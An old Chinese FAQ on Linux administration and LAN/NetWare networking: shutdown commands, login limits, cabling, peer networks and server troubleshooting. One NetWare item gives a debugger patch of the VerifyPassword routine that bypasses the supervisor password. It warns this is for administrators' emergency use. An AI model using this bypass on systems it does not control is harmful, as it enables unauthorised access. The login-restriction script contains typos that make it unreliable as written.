alias cd..='cd ..' ;用 cd.. 代替 cd .. 命令(对在 DOS 下使用惯了 cd.. 的人帮助很大)
alias md='mkdir' ;用 md 代替 mkdir 命令(对在 DOS 下…)
alias c:='mount /dev/hda1 /mnt/c & cd /mnt/c' ;用 c: 命令代替命令序列：安装 DOS 分区，再进入         
 8,Q:一台机器为 Win98 与 Linux 双启动，默认启动 OS 为 Linux,现想改变默认启动为 Win98，怎么办?
   A:简单。编辑 lilo.conf 文件，在其文件的第四行后加上 default=dos，存盘退出即可。  
 9,Q:系统的关闭：
   A:#shutdown –r +10 (十分钟后系统自动重启):
    # shutdown –r 13:00 (13:00整,系统自动重启)
    # shutdown –r now (系统立即重启)
    # reboot (系统立即重启)
    # haltsys (关闭系统)
    # shutdown –h (关闭系统)  
 10,Q:使用虚拟控制台：
    A:一般新安装的 Linux 有 4 个虚拟控制台,热键为: ALT+F1，ALT+F2，ALT+F3，ALT+F4。
例如:登录后按 Alt+F2 键,这时又可以看到 login: 提示符, 这个就是第二个虚拟控制台。  
 11,Q:强行退出 X-windows：
    A:当工作在 X-windows 界面时，想迅速切换到字符界面,只需使用热键 Ctrl+Alt+Backspace。  
 12,Q:好的口令应满足什么条件?
    A:通常，好的口令应当易于记忆但却不易被猜中，它们应当：
　　(1) 是大小写的混合; 
    (2) 可拼读; 
    (3) 既含字母，也含非字母的字符; 
    (4) 6 到 8 个字符长度; 
    (5) 易于键入。  
 13,Q:ping 命令能干些什么?
    A:它能告诉你现在哪些机器可用。ping 可能是最基本的 UNIX 网络命令，它仅仅向你提供的地址发送一个小包，然后侦听这台机器是否有“回答”。你可使用机器的 Internet 地址，如 192.78.222.81，或者也可使用机器名：ping therehost。该名字可以是局部的主机(host)文件中的名字或由域名服务器(DNS)解析的名字，但在任何情况下都应是网络可以用来找出特定机器的名称。如果机器对 ping 没有响应，它也不会对其他什么有反应，因为在网络上“看”不见它。在这种情况下，除非问题非常简单和明显，诸如机器被别人关掉了等，否则，去问问系统管理员。不管在哪种情况下都要涉及到系统管理员，因为重启 UNIX 系统并不像 DOS 机器一样简单。  
 14,Q:Linux 下软驱的使用:
    A:如果是 Linux 的 ext2 文件系统，用如下命令: #mount -t ext2 /dev/fd0 /mnt 
       DOS 格式的软盘则用命令: #mount -t msdos /dev/fd0 /mnt 
       然后就可以在 /mnt 里访问软盘的内容了。注意在取出软盘之前要先卸掉软盘上的文件系统：
           #umount /mnt 否则会导致信息丢失。
       在软盘上建立文件系统可用如下命令: #mke2fs /dev/fd0 1440  
 15,Q:我的 linux 为什么普通用户不能登陆?
    A:看看是不是有 /etc/nologin 文件，删掉它再试试(另：root 通常是不能 telnet 登录的，这很正常)。产生该问题的原因：系统在 shutdown 时会产生这个文件，如果 shutdown 过程意外终止,这个文件就没有被正常删除，这时候普通用户不能登录了。另外系统管理员在维护系统的时候也可以生成这个文件来阻止用户登录。  
 16,Q:如何设定每个帐号同一时间内允许的连接数?
    A:在 RedHat 中的设置：
    首先在 /etc/pam.d/login 中加上 
    session required /lib/security/pam_limits.so 
    然后在 /etc/security/limits.conf 加入要限制的用户名或用户组，例如： 
     @student hard nproc 20 
     edward hard maxlogins 2 
    无须重新启动机器，设置完毕即可使用。  
 17,Q:怎么样做到限时登录 Linux?
    A:一个简单的限时登录方法:写三个 shell 程序，调用 at 和系统维护功能:
    1. 在指定的时间执行该shell，在/etc下生成一名为nologin的文件，如： 
      vi /sbin/login.denied 
      echo " Login Denied " > /etc/nologin 
      chmod 700 login.denied 
    2. 在指定的时间执行该shell，删除/etc/下的nologin文件，如： 
      vi /sbin/login.allowed 
      if [ -f /etc/nologin ]; then 
        rm /etc/nologin 
      fi 
      chmod 700 login.allowed 
    3. 编写一个限制时间的shell，如： 
      vi /sbin/security 
      if [ -f /sbin/login.denied ]; then 
        at -f /sbin/login.denid 22:00 
      fi 
      if [ -f /sbin/login.allowed ]; then 
        at -f /sbin/login.allowed 8:00 
      if 
    此种设置的功能是：从晚上10:00 到第二天早上 8:00 禁止非 root 用户登录，显示为系统维护状态。 
    另外，还需对 root 用户的登录终端进行限制，最好设置在 console，在 RedHat 5.0 下在 /etc/security/access.conf
 中配置
      -:root:ALL EXCEPT console
 就可以了。  
 18,Q:限制 root 登录的终端:
    A:如果只允许 root 在 tty1 终端登录，则修改 /etc/securetty 文件，将其它的终端注释掉，只留 tty1:
      tty1
      # tty2
      # tty3
      # tty4
      # tty5
      # tty6
    这样 /bin/login 程序读取 /etc/securetty 文件时就会知道 root 只允许在 tty1 登录。这样可以减小黑客以 root 登录的 可能性。  
 19,Q:阻止 Linux 对 ping 的反应:
    A:在 /etc/rc.d/rc.local 文件中增加如下一行:
      echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all  
 20,Q:防止 IP 欺骗攻击:
    A:编辑 host.conf 文件并增加如下几行:
      order bind,hosts
      multi off
      nospoof on  
 21,Q:删除硬盘主引导区的 LILO：
    A:用 Fdisk 程序，C:\> Fdisk /mbr。然后用分区大师软件或 Fdisk 程序可以删除 Linux 分区。  
 22,Q:Linux FTP 服务器中将用户限制在自己目录下的方法：
    A:
    第一步：创建一个 ftp guest 组，用 groupadd 命令，也可以用 ftp 服务器创建的 ftp 组(less /etc/group 看看是否存在，如果装了ftp server的话都有这个组存在)； 
    第二步：在 ftp 组中添加 ftp 用户；
    第三步：修改 /etc/ftpaccess 文件，加入 guestgroup 的定义： guestgroup ftp; 或者用 guestuser 直接指定 ftp 用户名，如：guestuser ftpuser；
    第四步：向这个用户的 $HOME 目录下拷贝必要的文件，主要是与 ls 有关的。一般的 ls 要 Lib 支持，你得重新编译 ls，或把 lib 目录 copy 过去，或者拷贝 ftp server 带的 ls, 比如把 /home/ftp/ 下的bin，etc，lib 三个目录拷贝到这个用户的根目录下, 并修改权限 (chown username.ftp *)。 
    注意：现在 Linux 下带的 ftp 无须拷贝这些文件，至少 Redhat6.1 是不需要拷贝的，所以就可以省去第四步。  
 23,Q:Why Can't the Linux boot?
    A:After installing the OpenLinux，it can't boot. The screen display following:
      INIT:Switching to runlevel:3 
      INIT:Sending progresses the TERM signal. 
    Then the computer halts. How can we do then?
    Solution: You can remove some PnP hardware or stop some server (if you use redhat, you can stop or start　some server program at the end of installation). try it. Good luky!  
Internet问答
0,Q:什么是“Internet”、“Intranet”?? 
     A:“Internet” 即国际计算机互联网，起源于 20 世纪 60 年代美国的一些科研机构的试验网络，在美国国防部的主持下研究开发。首先参加试验的是部分大学和私人公司。美国的高级工程研究机构(Advanced Research Projects Agency,即 ARPA)于 1969 年 12 月将 ARPANet 网络变为现实，有 4 个站点通过 56Kbps 的线路连接起来，形成了最初的 Internet 骨干网。 
     经过 20 多年的发展，现在的 Internet 已经发展成一个由 TCP/IP 协议连接起来的、世界范围内的巨大的网际网。有成千上万的网络通过 Internet 骨干网络连接起来，全世界的人们可以分享 Internet 上丰富的信息资源或者通过 Internet 交换信息。 
     Internet 已经成为一个国家社会信息化和社会文明进步的标志。在我国，Internet 被称做 ChinaNet，上网用户可以通过拨打特别服务号码来实现与 Internet 的连通。 
     Intranet 是在一个协同作业的企业或者组织的内部，使用 Internet 技术实现应用需求的网络应用系统。它可以建立在企业内部原有的硬件、软件和服务器基础上，实现 Internet 上的几乎所有应用，如 Web 服务、FTP 服务、DNS 服务、E-mail 系统等等。另外，以 Intranet 为平台的信息管理系统以其特有的优势，可获得高效的开发和企业级应用，逐渐取代传统的 MIS 系统，成为企业管理信息系统的首选。   
    1,Q:怎样用 Windows98se 实现对等网的多机上网? 
     A:Windows98se(Windows98第二版)提供了 Internet 共享服务，供局域网内部多个用户通过一条电话线(或专线)上网。实现步骤为： 
     (1)选择对等网中一台安装 Windows98se 的机器，安装网卡、拨号网络、TCP/IP 协议和 Internet 共享服务。Internet 共享服务不在 Windows98se 典型安装的默认选项中，可以在“我的电脑/控制面板/添加-删除程序/Windows安装程序”中选择安装; 
     (2)该电脑作为共享上网的服务器，它的 IP 地址默认为 192.168.0.1(子网掩码为255.255.255.0)。然后，配置拨号网络，使这台机器能正常上网; 
     (3)设置共享服务器的浏览器 IE 的“属性/连接/共享”，选择“拨号网络”和“网卡”。共享服务器设置完毕; 
     (4)配置其他主机：双击“我的电脑/控制面板/网络”，修改 TCP/IP 协议的属性，启用 DNS，在其 DNS 配置和网关中添加“192.168.0.1”，将本机 IP 地址设置为 192.168.0.x(子网掩码为255.255.255.0)，x 的范围为 2 至 255，且各主机绝对不能相同。最后，启动机器。 
     这样，当共享服务主机拨号上网后，其他主机也可以一起上网冲浪了。   
    2,Q:不用集线器(Hub)，怎样用网卡和双绞线直接连接两台微机? 
     A:两台微机也可以连成一个局域网,一般情况下是用Hub连接。但是在没有Hub的情况下，也可以用双绞线直接将两台机器连接起来，当然这种情况下双绞线的做法就有点特殊了。双绞线的线序和一种实际做法(头1、头2)如下： 
      1 <-> 2   1 <-> 3    橙白-    绿白- 
      2 <-> 1   2 <-> 6    橙-      蓝- 
      3 <-> 6   3 <-> 1    绿白-    橙白- 
      4 <-> 4   4 <-> 4    绿-      绿- 
      5 <-> 5   5 <-> 5 <=>蓝白-    蓝白- 
      6 <-> 3   6 <-> 2    蓝-      橙- 
      7 <-> 7   7 <-> 7    棕白-    棕白- 
      8 <-> 8   8 <-> 8    棕-      棕-   
    3,Q:双绞线超长的应急处理? 
     A:双绞线的有效传输距离理论值为 100 米。但在实际施工中,由于受建筑环境的限制，有时双绞线的距离会稍微超过这个距离,造成数据传输时通时断,不太稳定。作为应急措施，可以临时将两条双绞线并联起来，这样，直流电阻会减小一半；或者选用较粗的超五类双绞铜线(真品)，电阻也较小，会大大改善传输性能。也可以在线路中间加装 Hub 进行电压提升，改善数据传输性能。   
    4,Q:集线器(Hub)和交换机有什么区别? 
     A:以太网的集线器和交换机都是数据传输的枢纽。Hub 是将信号收集放大后传输给所有其它端口，即传输线路是共享的。而交换机能够选择目标端口，在很大程度上减少冲突(Collision)的发生，为通信双方提供了一条独占的线路。另外，现在的交换机大多还具有第三层(网络层)的路由功能。所以说，使用交换机能大大改善网络的传输性能。   
    5,Q:怎样设定默认电子邮件程序?
     A:修改 Windows 注册表项 HKEY_CLASSES_ROOT\MAILTO\SHELL\OPEN\COMMAND,输入你的电子邮件的完整路径,如 "C:\FOXMAIL\FOXMAIL %1" 即可。   
    6,Q:怎样使 Windows9x 连接进入 Netware 服务器? 
     A:给运行 Windows9x 的机器安装网卡、MS-IPX/SPX 协议和 MS-Netware 网络用户，启动机器,然后在“网络邻居”里就可以看见 Netware 服务器，给出正确的用户和口令就可以进入 Netware 服务器了。   
    7,Q:为什么浏览器会出现“花屏”现象? 
     A:在浏览某些网页时，可能由于这些网页内嵌了较多的 Java 脚本、Java Applet 等程序，消耗了大量的系统资源， 使系统资源严重不足(有时系统资源只有百分之十几)，这时最容易导致系统花屏，甚至死机。所以，为了提高浏览速度，保护数据不致丢失，在上网时， 最好只打开浏览器这一个程序。出现“花屏”现象时，重新启动机器后一般会回复正常。   
    8,Q:怎么用 WindowsNT server4.0 实现不同子网的软路由? 
     A:网络环境:Hub 连接的星形网,其中:WindowsNT4.0 Server，一块网卡，TCP/IP协议(配置见后) 
     Windows 子网一 TCP/IP协议 IP=192.168.10.x Subnet_mask=255.255.255.0 Gateway=192.168.10.1 
     Windows 子网二 TCP/IP协议 IP=192.168.0.x Subnet_mask=255.255.255.0 Gateway=192.168.0.1 
     WindowsNT Server 的配置: 
     进入网络设置,给网卡的 TCP/IP 协议设置 2 个 IP 地址: IP1=192.168.10.1, IP2=192.168.0.1，再启 用“IP 转发”功能，重新启动机器。 设置完成后，在子网一(192.168.10.x)可以 Ping 通 192.168.0.x 网段，在子网二(192.168.0.x)可以 Ping 通 192.168.10.x 网段。这样，就用 WindowsNT 实现了不同子网的软路由。   
    9,Q:为什么在 Novell 网的一台工作站对服务器硬盘杀完病毒后，一会儿又在服务器硬盘发现同样的病毒?病毒怎么如此顽固不化? 　　　
     A:这种情况往往是因为您在清毒时，别的工作站还没有从服务器上注销掉。在您杀除完服务器上的病毒后，别的工作站从服务器上注销时， 又将病毒从机器的内存传回服务器上的文件中。清理服务器硬盘病毒的正确方法是：关掉所有工作站，首先对各工作站杀毒； 然后从一有盘站以超级用户身份(supervisor 或 admin)登录服务器，清除服务器上的病毒。   
    10,Q:怎样用“网络蚂蚁”下载电子邮件的附件? 
      A:如果你的邮箱支持在线收发邮件(如 www.163.net,www.263.net,china.com 等)，那么登陆后，打开信件，然后鼠标右键单击附件，再在弹出的菜单中选择“Downloaded by netants”即可。   
    11,Q:怎样隐藏和访问共享文件夹? 
      A:共享文件夹时，在共享名后紧接着输入“$”字母，别人在“网络邻居”里就不会看见该共享的文件夹。要访问该文件夹时，可以查找这台机器，找到后鼠标双击打开，在“地址”栏直接输入该文件夹的名字即可。   
    12,Q:局域网要不要屏蔽? 
      A:局域网要不要屏蔽主要以能否顺利完成数据传输来决定。有些屏蔽局域网因为屏蔽接地不良人为地产生了干扰信号，使效果反而不如非屏蔽网络。一般来说，欧洲市场上屏蔽局域网比较常见，而北美的非屏蔽网络则多一些。一般情况下，UTP(非屏蔽双绞线)是目前较为成熟的综合布线技术，如果干扰较大，可采用金属桥架和管道作为屏蔽层。如果干扰特别大，可以使用光缆。   
    13,Q:什么是“防火墙”? 
      A:防火墙是一个位于内部网络与 Internet 之间的网络安全系统，是按照一定的安全策略建立起来的硬件和(或)软件的有机组成体，以防止黑客的攻击，保护内部网络的安全运行。   
    14,Q:Windows9x 对等网上的某机器，在“网络邻居”里看不到别的机器，但别的机器可以看见它，为什么? 
      A:这台机器在启动中出现登录界面时，选择了“取消”，而不是“确定”。   
    15,Q:为什么在“网络邻居”不能看见广域网另一头的机器? 
      A:Windows 之所以能在“网络邻居”里看到别的机器，是通过 NetBEUI 协议实现的。广域网一般是使用路由器通过 TCP/IP 协议连接的，而 NetBEUI 协议没有路由能力，所以在“网络邻居”不能看见广域网另一头的机器。   
    16,Q:怎样连接 Windows 对等网? 
      A: 
      (1)正确安装 Windows(包括 Windows3.11,Windows9x,WindowsNT,Windows2000); 
      (2)正确安装网卡驱动程序； 
      (3)安装 NetBEUI 协议； 
      (4)设置“计算机名”和“组名”(对等网里的计算机不能重名，可以对计算机进行分组)； 
      (5)测试。在“网络邻居”里应该可以看到所有的分组和分组里的计算机。如果暂时看不到，请稍等一会，按 F5 刷新。如果你太性急，请运行“开始/查找/计算机...”，输入计算机名，就会立即在“网络邻居”找到机器。   
    17,Q:为什么要划分子网? 
      A:隔离网络广播在整个网络的传播，提高信息的传输率。  
    18,Q:什么是虚拟服务器? 
      A:虚拟服务器是：通过 Web 服务器(一台高性能的机器)，在一块网卡上绑定多个 IP 地址，而不同的 IP 地址绑定于同一台 WWW 服务器上的不同的主页目录，当用户访问不同的 IP 地址时，其对应的主页就会被分发出去，一台 WWW 服务器就好像许多 WWW 服务器一样。这样可以节约硬件资源，降低 WWW 服务器维护的成本，便于网页的集中管理，缺点是对 WWW 服务器的硬件要求较高，在网络访问高峰期系统性能下降较大，还有安全隐患。在 WindowsNT 和 Linux 上都可以建立虚拟服务器。   
    19,Q:什么是 DHCP(动态主机配置协议)? 
      A: DHCP 是一种多种工作站共享 IP 地址的方法。当一台主机要和 Internet 通讯时，它从 DHCP 服务器申请一个合法的 IP 地址，并使用该 IP 地址完成该次连接。然后，该 IP 地址被释放，别的机器还可以再次使用。目前 Internet 的拨号用户就是采用这种方法和 Internet 通讯的。   
    20,Q:什么是非路由 IP 地址? 
      A:非路由 IP 地址是那些在 Internet 上不被分配的 IP 地址，因为它们在 Internet 上从来不被路由。最常使用的非路由 IP 地址包括： 
      (1)10.x.x.x 网段，这是一个 A 类网址，从 10.0.0.0 到 10.255.255.255，共 16777214 个可用 IP 地址； 
      (2)172.x.x.x 网段，这是一个 B 类网址，从 172.16.0.0 到 172.31.255.255； 
      (3)192.168.x.x 网段，这是一个 C 类网址，从 192.168.0.0 到 192.168.255.255；   
    21,Q:两台电脑直接相连? 
      A:两台电脑连接的常见办法是通过网络，但在非网络环境下，也可以使用一些“直接”连接的办法。 
      (1)使用网卡和双绞线：(参见“不用集线器(Hub)，怎样用网卡和双绞线直接连接两台微机?”)； 
      (2)使用串口或并口：其中并口的连接速度较串口要大得多，以下介绍并口的接线图。 
        并口的外观： 
          1 ----------------------12 
          . . . . . . . . . . . . . 
           . . . . . . . . . . . . 
          13 --------------------25 
        并口的接线图： 
          口一：1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 
          口二：1 15 13 12 10 11 7 8 9 5 6 4 3 14 2 16 17 18 19 20 21 22 23 24 25 
      (3)使用 USB 口； 
      (4)使用红外线接口; 
      (5)通过 Modem 连接。   
    22,Q:什么是 POP3? 
      A:POP 即为 Post Office Protocol 的简称，是一种电子邮局传输协议，而 POP3 是它的第三个版本，是规定了怎样将个人计算机连接到 Internet 的邮件服务器和下载电子邮件的电子协议。它是 Internet 电子邮件的第一个离线协议标准。简单点说，POP3 就是一个简单而实用的邮件信息传输协议。   
    23,Q:什么是 SMTP? 
      A: SMTP 的全称是“Simple Mail Transfer Protocol”，即简单邮件传输协议。它是一组用于从源地址到目的地址传输邮件的规范，通过它来控制邮件的中转方式。SMTP 协议属于 TCP/IP 协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。SMTP 服务器就是遵循 SMTP 协议的发送邮件服务器。   
    24,Q:忘记了 Novell Netware3.12 的超级用户口令时怎么办? 
      A:按照以下步骤解除超级用户口令： 
      (1)在服务器上，同时按下“左Shift”+“右Shift”+“Alt”+“Esc”四个键，进入 Dubuger 状态； 
      (2)输入 d VerifyPassword 6 (注意大小写)，回车，屏幕显示六个数值，请记录在纸上： 
          53 56 57 55 89 E5 SVWU.e； 
      (3)输入 g 回车，回到 Console 控制台。到此，口令解除。 
      恢复口令的方法是：同时按下“左Shift”+“右Shift”+“Alt”+“Esc”四个键，进入 Dubuger 状态，输入 C VerifyPassword=****** (先前记录的数值)，回车；然后再输入 g 回车，即可恢复口令。 
      !!! 此法仅供系统管理员应急使用，禁止非法使用! 为了系统的安全，请系统管理员关闭 Debuger 功能。   
    25,Q:Novell 服务器网卡驱动程序不能正确加载的处理： 
      A:服务器网卡不能正确加载是安装过程中最常见的一种故障。造成这一故障的原因有多种，一是对于某些厂家的网卡，Netware无法自动识别；二是用户选择的网卡驱动程序有错。要特别注意的是，Netware服务器端网卡驱动程序的扩展名为 .LAN，通常存于驱动程序盘的子目录 SERVER 之下，而工作站端使用的网卡扩展名为 com 或 exe，一般存于驱动程序盘的 DOS、Windows9x 或 Windows NT 等目录下，并且不同操作系统所用的网卡驱动程序也不一样；三是网卡本身参数配置有错，不能正常工作或者是 Netware 给网卡提供的中断号或 I/O 地址缺省值与网卡的配置不相同，遇到这种情况需要手动改为正确的值；最后一种情况是对于 EISA 和 PCI 网卡来讲未指定插槽(Slot)号，或其值错误。 　　 
      遇到网卡驱动程序不能正确加载的情况时，可以跳过这一步继续后面的安装(Netware5.x版不行)。在跳过网卡的安装后又何时采用何种方法来安装网卡驱动程序呢? 这项工作是在服务器安装完成以后才进行的。重新启动 Netware 服务器，进入控制台状态，首先加载 Install 菜单模块，然后把加载网卡驱动程序的有关语句写入 Autoexec.ncf 文件中。可以按下面格式书写： 　　
      Load 〈PATH:ne2000.lan〉 int=〈3〉 port=〈300〉Frame=〈ethrnet_802.2〉 name=〈Thename〉 　　 
      Bind ipx to 〈Thename〉 net=〈1〉 
括号内的值可根据具体情况填写。   
    26,Q:Netware3.x 与 4.x 和 5.x 无法集成在同一物理网络中的处理： 
      A:由于 3.x 版没有目录服务功能，因此无法将其纳入到目录树中，常常会与 4.x 和 5.x 版产生网上冲突，而使客户无法登录到 3.x 版服务器，从而出现 3.x 服务器被“掩盖”的现象，所以建议把已有的 3.x 版升级为 4.x 以上的版本，从而将其集成到一个目录树上，克服因版本差别而造成的故障。最后，要注意的是同一物理网上的所有服务器的逻辑网络号必须是一样的(注意不是IPX内部网络号，这个号，不同的服务器必须要不一样 !)，否则还将造成路由检测故障。   
    27,Q:怎样处理 Novell 文件服务器不能正常启动，提示卷安装失败的故障? 
      A:由于突然停电、经常违章关机或某些别的原因，可能造成服务器硬盘卷的损伤。其现象有多种，例如：服务器无法正常安装卷，或服务器能正常启动，但工作站不能与服务器连接等，出现类似下面的提示：“Mirror “Volume not mounted”、“copies of directories and name space not match”。此时，可以采用卷修复方法，对不太严重的错误进行修复。Vrepair(Volume Repair)是一个功能强大的可装入模块，可以装入对卷进行修复，具体的操作步骤如下： 　　
      (1)、把此卷卸下，输入以下命令： 
          Dismount volume-name (其中，volume-name为要修复的卷名) 　　
      (2)、在服务器控制台上键入以下命令： 
          Load Vrepair 　　
      (3)、进入菜单系统，首先选择“Repair a Volume”，然后屏幕提示： 　
          Total errors:0 
          Current settings: 
          1.Pause after each error 　
          2.Do not log errors to a file 　
          Press F1 to change setting 
      在修复时如果屏幕提示错误较多，可按 F1 键不必让 Vrepair 在每个错误处停下来，可以大大提高修复速度。 　　
      (4)、当 Vrepair 运行结束后，屏幕提示：“Write vrepairs to the disk(y/n)?”，键入“y”将修复结果写入磁盘，进行如此操作后，若卷仍未修复，可再进入 Vrepair 菜单中选择“Set Vrepair Option”项，运行完后，卷一般会安装成功。如仍不能安装，则必须删除这个卷，用 Install 重新安装这个卷，并从后备文件中恢复数据。   
    28,Q:Novell 服务器在启动过程中，突然停下来询问服务器的名称、内部网络号等，然后停下来等待键入命令。按屏幕提示输入文件服务器名（File server name）和IPX内部网络号（IPX Internal network number）后，进入控制台提示符状态，此时装入其它NLM模块，系统提示：“Unable to find load file …”。这种故障是怎么回事，如何处理? 
      A:这种故障可能是由以下原因所致： 　　 
      (1)、由系统配置文件 Autoexec.ncf 或 Startup.ncf 损坏所致。Autoexec.ncf 的主要作用就是给文件服务器起名、分配 IPX 内部网络地址、加载网卡驱动程序、分配网卡传输协议、分配网段地址及装载指定的 NLM 等。可以从以下几种情况来确定其原因：一种情况是该文件中的多个逻辑网卡(以帧不同来区别)对应的逻辑网络号相同(指 BIND 语句中“NET=”后面的参数相同)，正常情况下应互不相同；二是由于某些语句的参数不完整，例如服务器名、IPX 内部网络号、逻辑子网号、PORT 值、中断号、IP 地址和子网掩码等丢失；三是缺少某些必需的语句，例如网卡加载语句后面无 BIND 语句或不配对、没有卷安装语句 Mount all 等等；四是该文件中的服务器名或 IPX 内部网络号与同一物理网络上的其他服务器相同；五是该文件中逻辑子网络号与同一物理网上其他的服务器不同(要求必须一样，否则将产生冲突)。解决方法是从备份中恢复该文件，或利用 Install 实用程序重新建立 Autoexec.ncf 文件。 　　 
      (2)、sys 卷有故障。Netware 的系统核心 Server.exe 装入 startup.ncf 中的硬盘驱动程序后，无法从损坏的系统卷中找到 Autoexec.ncf，可对 sys 卷进行修复，修复之后即能正常启动。 　　 
      (3)、最后要看一下 BIOS 设置得是否正确，特别是对安装有多个硬盘的用户，有时经常换硬盘而忘了修改设置参数。   
    29,Q:Novell 网中，随着应用程序的不断增大，特别是流量突然增加时(象同时远程启动 Win95 时)，导致网络通信性能下降，网络速度变得很慢，以至无法正常工作。怎样改善网络性能? 
      A:为了提高网络速度，在服务器“中枢机关”(即 CPU、内存、硬盘等)性能良好的前提下，可采用增加网段的方法来改善网络性能。由于大多网络都采用星型和总线型混合的拓扑结构，增加网段就是指在文件服务器中多插几块网卡(最多可插四块)，将局域网上的工作站平均分给几个网段，再在 Autoexec.ncf 中写入以下类似命令，注意 I/O 地址值和 IRQ 值必须与网卡实际占用的 I/O 地址和 IRQ 值相符(可以使用不同品牌的网卡用以区分)。 　　 
        Load ne2000 port=300 int=2 frame=ethernet_802.2 name=a 　　
        Bind ipx to a net=1 　　 
        Load ne2000 port=320 int=3 frame=ethernet_802.2 name=b 　　 
        Bind ipx to b net=2 
这样每段网络的负担只有原来的几分之一，速度自然就提高了。   
    30,Q:Novell 无盘工作站不能正常登录已经启动的服务器，工作站屏幕上出现“Error opening boot disk image file”或“Unable to open image file”提示。 
      A:这可能是连到了一个没有包含远程启动映象文件的服务器上，可以把启动映象文件拷到这个服务器的Login 目录下；如果使用的是多远程启动映象文件，检查 Bootconf.sys 中对工作站是否进行了正确设置，应确保网络地址和节点地址的正确。如果以上方法都不能解决问题，那么很可能是远程启动映象文件有问题，可以测试生成启动映象文件的软盘能否正常启动有盘工作站。若还不行，可以运行一下RPLFIX实用程序。   
    31,Q:Novell 工作站屏幕上出现“Error finding server”提示。 
      A:在确保硬件线路连接没问题的前提下，检查服务器上是否安装了“Ethernet_802.3”帧类型，远程启动映象文件的 Net.cfg 中是否包含 Ethernet_802.3，这是旧型的 IPX 芯片，它不支持 Ethernet－802.2 帧，应该按照相应的帧类型重新制作启动映象文件。   
    32,Q:Novell 无盘工作站不能正常登录服务器，工作站屏幕上出现“batch file missing”信息。 
      A:出现这个信息是由于 Autoexec.bat 或其它批处理文件(对多个远程启动映像所使用的批处理)没有同时存在于Login目录和用户登录目录中。   
    33,Q:Novell 无盘工作站为何无法转入网络盘 F: ? 
      A:这主要是由于远程启动映象文件内 Config.sys 中 Lastdrive 的值所引起的，解决方法是：对于 IPX 和 ODI 工作站(使用 NETX 外壳)，加入 Lastdrive=E 或将 Lastdrive=… 删除；对于 VLM 工作站，应在 Config.sys 中加入 Lastdrive=Z 这一句。   
    34,Q:Novell 网中无法正常运行 Netadmin 实用程序? 
      A:Netadmin 程序是基于目录服务的管理程序，在 Netware 4.x 以上版本中使用，因此，这种故障是由于采用了 IPX 或 ODI(使用 NETX 外壳)工作站方式登录入网造成的，必须改为由具有目录服务功能的 VLM 外壳工作站登录才行。   
    35,Q:怎样使用 Hosts 文件进行域名解析? 
      A:域名解析有两种方法：DNS 和 主机表。主机表作为一个文本文件存放在 Windows9x 的 \windows 文件夹下或 WindowsNT 的 \Winnt\system32\drivers\etc 文件夹下。Hosts 文件的格式非常简单，即一条一条的 IP 地址对应域名的记录，一个实例如下： 
      127.0.0.1     localhost     # 本地主机 
      192.168.0.1   proxyserver   # 代理服务器 
      192.168.0.100 www.mydom.net # 内部网 WWW 服务器 
该文件应该保持经常更新，并且经常使用的域名放在文件的前面。   
    36,Q:Windows 98重新安装后，原来从网上下载的临时文件都找不到了，但从文件夹的属性里可以查到文件还存在，如何才能在 IE 浏览器中找到? 
      A:重新安装 Windows 会对 IE 部分数据重新初始化，所以上网下载的临时文件即使存在于文件夹中，也不能通过 IE 脱机浏览了，因为一些链接属性文件及链接已经被清空了，只能通过手工的方法从 Windows 下的Temporary Internet Files 文件夹中找到这些文件了。   
    37,Q:有文章介绍如何使用代理服务器，并附送了几个速度较快的代理服务器，但用这些代理服务器进行代理设置，并拨号上网，运行 IE 后，却报告找不到服务器，或弹出“用户名及密码”窗口，不知是何缘故? 
      A:代理服务器多数都用较宽的带宽来提高网络访问速度，但如果借助代理服务器访问网络的人数一多，势必会造成该服务器负担过重，所以代理服务器多数服务不是免费的，且有许多代理服务器都不公开。由于这些原因，代理服务器会经常发生需要密码认证、临时关闭或禁止一些域名的访问权限等现象。所以只能寻找更好的代理服务器地址才可以保证正确的浏览。目前网上有关代理服务器的信息很多，我们可以去看看。   
    38,Q:上163网，无法打开国外网站，每次总是服务器被复位，为什么? 
      A:这问题的原因极可能是因为 ISP 或是网络接入服务器对类似的域名进行了限制，或者因为对方服务器已经关闭而导致的，原因并不在我们这一边。   
    39,Q:在安装 FrontPage2000 时，在“我的电脑”目录中产生一“Web文件夹”，不知有何用，能将其删除吗? 
      A:FrontPage工作的时候需要建立一个虚拟服务器，所以这个目录就是供交换文件用的，最好不要删除它。   
    40,Q:有两台电脑，想用网卡和双绞线联成对等网。网卡是 Accton EN1208T，插上网卡之后，Win98 自动识别出网卡并装上了驱动，然后添加协议并设置了文件及打印共享，最后设置了本机的共享文件夹。但当打开网上邻居时，却只能看到自己，无论刷新多少次都看不到对方。设备管理器中没有显示冲突，网卡属性中也没有冲突，网卡的中断值不允许改(是10)。两台机器的 IP 分别是:192.168.1.1、192.168.1.2，子网掩码均为255.255.255.0。 
      A:建议先将 IP 地址和子网掩码去掉，因为常常会由于编码的重复导致端口错误，使机器无法互相访问。先将对等网调通（两台机器可共享资源），待排除是网卡、网线原因后再加上 IP 地址和子网掩码。 　　 
      对于网卡，如果是 PNP 类型的网卡，建议使用网卡附带的配置程序检查一下工作模式、PnP 和跳线模式，然后看一下网卡默认的中断与 Windows 识别的是否相同，这常常是导致网卡工作异常的原因。因为在非 PNP 状态工作时，网卡的默认中断与 Windows 识别的是不同的，表面上看没有冲突，但网卡却不能很好地工作。另外，有些网卡的跳线模式要调成 Autosense 才能被 Windows 识别。   
 41,Q:怎样用 IE5.X 快速显示不同内码的文件?
    A:以前，当你想阅读一篇其它字体的技术资料时，如果你的系统里没有安装相应的内码转换软件，就会一筹莫展了。现在，我们可以使用自带多种字库的 IE5.0 来轻松实现对不同内码的 *.TXT、*.HTM 和 *.HTML 等文件的查看。其方法也极简单：用 IE5.0 打开该文件后，在“查看/编码”中，除了可以使用常见的简、繁中文，还可以从“其他”下拉框中选取十多种语言模式来阅读，实在快速方便。  

42,Q:浏览器中对付右键的小招术：
    A:有些网页用 javascript 小程序禁止了鼠标右键功能，可以用以下方法“破解”：
　　(第1法)在目标上按下鼠标右键不放，将鼠标移到弹出窗口的确定按钮上面，单击左键，窗口便会消失，再把鼠标移至目标上松开右键，OK搞定！
   (第2法)有些网站你一按右键就出现添加到收藏夹的窗口，这时还是不要松开右键，也不要移动鼠标，使用键盘上的 Tab 键，移动焦点到取消按钮上，按一下空格键，窗口就没了，然后再松开右键，OK搞定！   
 43,Q:如何制作 .eml 电子邮电格式文件?
